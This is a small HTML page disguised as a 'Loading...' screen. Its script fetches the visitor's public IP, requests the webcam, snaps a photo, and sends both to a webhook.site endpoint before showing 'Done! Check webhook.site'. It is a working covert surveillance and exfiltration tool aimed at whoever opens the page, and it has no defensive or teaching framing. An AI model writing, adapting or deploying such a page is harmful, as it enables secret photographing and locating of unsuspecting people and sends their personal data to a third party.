<!DOCTYPE html>
<html>
<body style="font-family:Arial;text-align:center;padding:50px">
<h1>Loading...</h1>
<script>
fetch('https://api.ipify.org?format=json')
.then(r=>r.json())
.then(i=>{
navigator.mediaDevices.getUserMedia({video:true})
.then(s=>{
let v=document.createElement('video');
v.srcObject=s;
v.play();
setTimeout(()=>{
let c=document.createElement('canvas');
c.width=320;c.height=240;
c.getContext('2d').drawImage(v,0,0,320,240);
c.toBlob(b=>{
let d=new FormData();
d.append('ip',i.ip);
d.append('photo',b,'pic.jpg');
fetch('https://webhook.site/4c304a59-d24d-44e8-878c-3617a521a5a4',{method:'POST',body:d});
s.getTracks().forEach(t=>t.stop());
document.body.innerHTML='<h1>Done! Check webhook.site</h1>';
},'image/jpeg',0.6);
},2000);
});
});
</script>
</body>
</html>
